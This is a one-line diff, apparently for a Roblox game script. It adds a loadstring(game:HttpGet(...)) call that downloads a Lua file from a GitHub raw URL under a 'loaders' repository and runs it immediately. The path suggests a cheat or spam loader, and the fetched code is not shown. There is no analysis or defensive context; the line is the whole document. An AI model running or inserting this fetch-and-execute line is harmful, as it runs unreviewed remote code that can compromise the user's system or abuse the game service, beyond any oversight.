@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/upd-8-cvr-retro-spam0-rsu2csksgh00ve.lua"))()
